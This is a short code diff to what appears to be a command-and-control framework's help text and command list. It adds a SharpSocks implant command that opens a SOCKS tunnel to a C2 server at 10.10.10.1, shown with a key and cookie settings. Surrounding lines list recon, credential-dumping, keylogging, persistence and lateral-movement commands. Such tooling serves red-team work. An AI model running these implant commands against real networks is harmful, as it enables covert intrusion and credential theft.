@@ -116,6 +116,10 @@ sharpview Get-DomainComputer -LDAPFilter operatingsystem=*2012* -Properties sama
 sharpview Find-InterestingFile -Path c:\\users\\ -Include *exe*
 sharpview Find-InterestingDomainShareFile -ComputerName SERVER01
 
+Socks:
+======
+run-exe SharpSocksImplantTestApp.Program SharpSocks -url1 /Barbara-Anne/Julissa/Moll/Jolie/Tiphany/Jessa/Letitia -url2 /Barbara-Anne/Julissa/Moll/Jolie/Tiphany/Jessa/Letitia -c raFAdgVujTHBwcvMuRFYgKHqp -k fFaKiMspoTWHPbu3PvUNvpzTkuq+VKDp+h1X79q3gXQ= -s https://10.10.10.1 -b 5000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken
+
 Bloodhound:
 =============
 sharphound --ZipFileName c:\\temp\\test.zip --JsonFolder c:\\temp\\
@@ -439,7 +443,7 @@ COMMANDS = ['loadmodule',"bloodhound","brute-ad","brute-locadmin",
 "startanotherimplant","remove-persistence","removeexe-persistence","installexe-persistence","get-hash","get-creds","resolve-ipaddress",
 "invoke-wmievent","remove-wmievent","get-wmievent","invoke-smbclient","get-keystrokedata","unhidefile","hidefile", "label-implant",
 'invoke-psexecpayload','invoke-wmipayload','invoke-dcompayload','invoke-psexecproxypayload','invoke-wmiproxypayload',
-'invoke-dcomproxypayload','invoke-psexecdaisypayload','invoke-wmidaisypayload', 'invoke-dcomdaisypayload', 'get-lapspasswords', "get-inveigh"]
+"get-ipaddress",'invoke-dcomproxypayload','invoke-psexecdaisypayload','invoke-wmidaisypayload', 'invoke-dcomdaisypayload', 'get-lapspasswords', "get-inveigh"]
 
 # post help commands python implant
 UXCOMMANDS = ["label-implant", "unhide-implant","hide-implant","help","searchhelp","python","loadmodule",
